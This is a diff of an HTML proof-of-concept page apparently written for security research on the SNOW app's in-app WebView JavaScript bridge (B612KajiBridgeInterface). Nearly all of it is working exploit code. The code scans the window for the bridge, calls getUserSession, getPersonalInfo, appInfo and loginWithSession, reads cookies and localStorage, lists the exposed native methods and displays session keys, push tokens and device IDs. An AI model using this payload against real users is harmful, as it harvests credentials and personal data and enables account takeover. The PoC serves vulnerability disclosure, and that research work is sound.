@@ -1,251 +1,110 @@
 
 <!DOCTYPE html>
-<html lang="ko">
+<html>
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PoC</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
-* { box-sizing: border-box; margin: 0; padding: 0; }
-body {
-  background: #0d1117;
-  color: #e6edf3;
-  font-family: 'Courier New', monospace;
-  font-size: 12px;
-  padding: 12px;
-  word-break: break-all;
-}
-.header {
-  background: #161b22;
-  border: 1px solid #30363d;
-  border-radius: 6px;
-  padding: 10px 14px;
-  margin-bottom: 12px;
-}
-.header h1 { font-size: 14px; color: #f85149; font-weight: bold; }
-.header p  { font-size: 11px; color: #8b949e; margin-top: 4px; }
-.card {
-  background: #161b22;
-  border: 1px solid #30363d;
-  border-radius: 6px;
-  margin-bottom: 10px;
-  overflow: hidden;
-}
-.card-title {
-  background: #21262d;
-  padding: 6px 12px;
-  font-size: 11px;
-  font-weight: bold;
-  color: #58a6ff;
-  border-bottom: 1px solid #30363d;
-}
-.card-title.ok   { color: #3fb950; }
-.card-title.err  { color: #f85149; }
-.card-title.warn { color: #e3b341; }
-.field {
-  padding: 6px 12px;
-  border-bottom: 1px solid #21262d;
-  display: flex;
-  gap: 8px;
-}
-.field:last-child { border-bottom: none; }
-.field-key   { color: #e3b341; min-width: 120px; flex-shrink: 0; }
-.field-val   { color: #79c0ff; flex: 1; word-break: break-all; }
-.field-val.sensitive { color: #f85149; font-weight: bold; }
-.field-val.ok       { color: #3fb950; }
-.field-val.empty    { color: #484f58; font-style: italic; }
-#status {
-  text-align: center;
-  padding: 20px;
-  color: #8b949e;
-  font-size: 13px;
-}
+body{background:#111;color:#0f0;font-family:monospace;font-size:12px;padding:10px;word-break:break-all}
+.r{color:#ff0;font-weight:bold;display:block;margin-top:6px}
+.v{color:#0ff}
+.e{color:#f44}
+.ok{color:#0f0}
 </style>
 </head>
 <body>
-
-<div class="header">
-  <h1>⚠ VULN-002: B612KajiBridgeInterface — PoC</h1>
-  <p>com.campmobile.snow / InAppWebViewActivity / JS Bridge 72 methods</p>
-</div>
-
-<div id="status">Bridge 탐색 중...</div>
-<div id="results"></div>
-
+<span class="r">== SNOW Bridge PoC ==</span>
+<div id="o"><span class="v">init...</span></div>
 <script>
-var results = document.getElementById('results');
-var status  = document.getElementById('status');
+var o = document.getElementById('o');
+var log = function(k, v, cls) {
+  o.innerHTML += '<span class="r">[' + k + ']</span><span class="' + (cls||'v') + '">' + String(v) + '</span>';
+};
 
-/* ── 유틸 ── */
-function card(title, cls, fields) {
-  var div = document.createElement('div');
-  div.className = 'card';
-  var h = document.createElement('div');
-  h.className = 'card-title ' + (cls||'');
-  h.textContent = title;
-  div.appendChild(h);
-  fields.forEach(function(f) {
-    var row = document.createElement('div');
-    row.className = 'field';
-    var k = document.createElement('span');
-    k.className = 'field-key';
-    k.textContent = f[0];
-    var v = document.createElement('span');
-    v.className = 'field-val ' + (f[2]||'');
-    v.textContent = f[1] == null ? '(null)' : (f[1] === '' ? '(empty)' : String(f[1]));
-    if (!f[1]) v.className += ' empty';
-    row.appendChild(k);
-    row.appendChild(v);
-    div.appendChild(row);
-  });
-  results.appendChild(div);
-}
-
-function parseJSON(s) {
-  try { return JSON.parse(s); } catch(e) { return null; }
-}
-
-/* ── 메인 ── */
-(function run() {
-
-  /* 1. Bridge 탐색 */
-  var BRIDGE_NAMES = [
-    'B612KajiBridgeInterface',
-    'AndroidBridge',
-    'snowBridge',
-    'kajiBridge'
-  ];
-  var bridge = null, bridgeName = null;
-  BRIDGE_NAMES.forEach(function(n) {
-    if (!bridge && typeof window[n] !== 'undefined') {
-      bridge = window[n]; bridgeName = n;
+function scan() {
+  // 1. window 전체 스캔 — Bridge 탐색
+  var found = [];
+  var keywords = ['bridge','Bridge','android','Android','kaji','Kaji','snow','Snow','interface','Interface'];
+  try {
+    for (var k in window) {
+      try {
+        if (typeof window[k] === 'object' && window[k] !== null && window[k] !== window) {
+          var lk = k.toLowerCase();
+          if (keywords.some(function(w){return lk.indexOf(w.toLowerCase())>=0;})) {
+            found.push(k);
+          }
+        }
+      } catch(e) {}
     }
+  } catch(e) {}
+
+  log('window scan', found.length ? found.join(', ') : '(none)', found.length ? 'ok' : 'e');
+
+  // 2. 직접 Bridge 이름 체크
+  var names = ['B612KajiBridgeInterface','AndroidBridge','androidBridge',
+                'snowBridge','SnowBridge','kajiBridge','KajiBridge',
+                'b612','B612','nativeInterface'];
+  var bridge = null, bname = null;
+  names.forEach(function(n){
+    var exists = false;
+    try { exists = typeof window[n] !== 'undefined'; } catch(e){}
+    log('typeof ' + n, typeof window[n], exists ? 'ok' : 'e');
+    if (exists && !bridge) { bridge = window[n]; bname = n; }
   });
 
   if (!bridge) {
-    status.style.color = '#f85149';
-    status.textContent = '✗ Bridge NOT FOUND — SNOW WebView 컨텍스트가 아닙니다.';
-    card('환경 정보', 'err', [
-      ['URL', location.href],
-      ['UserAgent', navigator.userAgent],
-      ['Bridge 탐색', BRIDGE_NAMES.join(', ')]
-    ]);
-    return;
+    log('RESULT', 'Bridge NOT found — 재시도 중...', 'e');
+    return false;
   }
 
-  status.style.display = 'none';
+  // 3. Bridge 발견
+  log('BRIDGE FOUND', bname, 'ok');
 
-  /* 2. Bridge 발견 */
-  card('Bridge 발견', 'ok', [
-    ['이름', bridgeName, 'sensitive'],
-    ['URL', location.href],
-    ['origin', location.origin]
-  ]);
+  // 4. 메서드 실행
+  try { log('getUserSession', bridge.getUserSession(), 'v'); }
+  catch(e) { log('getUserSession_ERR', e, 'e'); }
 
-  /* 3. getUserSession() */
+  try { log('getPersonalInfo', bridge.getPersonalInfo(), 'v'); }
+  catch(e) { log('getPersonalInfo_ERR', e, 'e'); }
+
+  try { log('appInfo', bridge.appInfo(), 'v'); }
+  catch(e) { log('appInfo_ERR', e, 'e'); }
+
+  log('cookie', document.cookie || '(empty)');
+
   try {
-    var sessionRaw = bridge.getUserSession();
-    var s = parseJSON(sessionRaw) || {};
-    card('getUserSession()', 'ok', [
-      ['userId',          s.userId         || sessionRaw, s.userId ? 'sensitive' : ''],
-      ['userOid',         s.userOid        || '', 'sensitive'],
-      ['name',            s.name           || '(없음)'],
-      ['isVIP',           String(s.isVIP)],
-      ['isCreator',       String(s.isCreator)],
-      ['availableReward', s.availableReward != null ? String(s.availableReward) : '', 'sensitive'],
-      ['totalCoin',       s.totalCoin      || '0'],
-      ['sessionKey',      s.sessionKey     ? s.sessionKey.substring(0,60)+'...' : '', 'sensitive'],
-      ['xColor',          s.xColor         ? s.xColor.substring(0,60)+'...'    : '', 'sensitive'],
-      ['pushToken',       s.pushToken      ? s.pushToken.substring(0,60)+'...' : '', 'sensitive'],
-      ['profileImageUrl', s.profileImageUrl|| ''],
-      ['userBadgeLevel',  s.userBadgeLevel || ''],
-    ]);
-  } catch(e) {
-    card('getUserSession()', 'err', [['오류', String(e)]]);
-  }
-
-  /* 4. getPersonalInfo() */
-  try {
-    var piiRaw = bridge.getPersonalInfo();
-    var p = parseJSON(piiRaw) || {};
-    var fields = [];
-    if (piiRaw && piiRaw !== 'null' && piiRaw !== '{}') {
-      Object.keys(p).forEach(function(k) {
-        fields.push([k, String(p[k]), 'sensitive']);
-      });
-      if (!fields.length) fields.push(['raw', piiRaw, 'sensitive']);
-    } else {
-      fields.push(['결과', piiRaw || '(empty)', 'empty']);
-    }
-    card('getPersonalInfo()', fields.some(function(f){return f[2]==='sensitive';}) ? 'ok warn' : 'warn', fields);
-  } catch(e) {
-    card('getPersonalInfo()', 'err', [['오류', String(e)]]);
-  }
-
-  /* 5. appInfo() */
-  try {
-    var ai = bridge.appInfo();
-    var a  = parseJSON(ai) || {};
-    card('appInfo()', '', [
-      ['appVersion',  a.appVersion  || ai || ''],
-      ['osVersion',   a.osVersion   || ''],
-      ['deviceModel', a.deviceModel || ''],
-      ['deviceId',    a.deviceId    || '', 'sensitive'],
-      ['locale',      a.locale      || ''],
-    ]);
-  } catch(e) {
-    card('appInfo()', 'err', [['오류', String(e)]]);
-  }
-
-  /* 6. Cookie / Storage */
-  var lsData = {};
-  try {
-    for (var i = 0; i < localStorage.length; i++) {
-      var k = localStorage.key(i);
-      lsData[k] = localStorage.getItem(k);
-    }
-  } catch(e) {}
-
-  card('Web Storage', document.cookie ? 'warn' : '', [
-    ['document.cookie', document.cookie || '(empty)', document.cookie ? 'sensitive' : 'empty'],
-    ['localStorage',    Object.keys(lsData).length ? JSON.stringify(lsData) : '(empty)',
-                        Object.keys(lsData).length ? 'sensitive' : 'empty'],
-  ]);
-
-  /* 7. loginWithSession() — 쿠키 갱신 후 재수집 */
-  try {
-    bridge.loginWithSession(function(loginResult) {
-      card('loginWithSession() 콜백', 'ok', [
-        ['결과',         String(loginResult)],
-        ['cookie after', document.cookie || '(empty)', document.cookie ? 'sensitive' : 'empty'],
-      ]);
-
-      /* 8. 로그인 후 추가 메서드 시도 */
-      ['getSubscriptionPath','getCreditshopPath','getABTestInfo'].forEach(function(m) {
-        try {
-          var v = bridge[m]();
-          if (v) card(m+'()', 'warn', [['결과', String(v)]]);
-        } catch(e) {}
-      });
+    bridge.loginWithSession(function(r){
+      log('loginWithSession', r, 'ok');
+      log('cookie_after', document.cookie || '(empty)');
     });
-  } catch(e) {
-    card('loginWithSession()', 'err', [['오류', String(e)]]);
-  }
+  } catch(e) { log('loginWithSession_ERR', e, 'e'); }
 
-  /* 9. 전체 메서드 목록 */
+  // 5. 전체 메서드 목록
   try {
-    var methods = [];
-    for (var key in bridge) {
-      if (typeof bridge[key] === 'function') methods.push(key);
+    var ms = [];
+    for (var m in bridge) {
+      try { if (typeof bridge[m]==='function') ms.push(m); } catch(ee){}
     }
-    if (methods.length) {
-      card('노출된 메서드 목록 ('+methods.length+'개)', 'warn',
-        methods.map(function(m){ return [m, 'function']; })
-      );
-    }
+    log('methods(' + ms.length + ')', ms.join(', ') || '(none)');
   } catch(e) {}
 
-})();
+  return true;
+}
+
+// 즉시 실행
+var done = scan();
+
+// 실패 시 재시도 (0.5s, 1s, 2s, 3s)
+if (!done) {
+  [500, 1000, 2000, 3000].forEach(function(t) {
+    setTimeout(function() {
+      if (!done) {
+        o.innerHTML += '<span class="r">[retry ' + t + 'ms]</span>';
+        done = scan();
+      }
+    }, t);
+  });
+}
 </script>
 </body>
 </html>
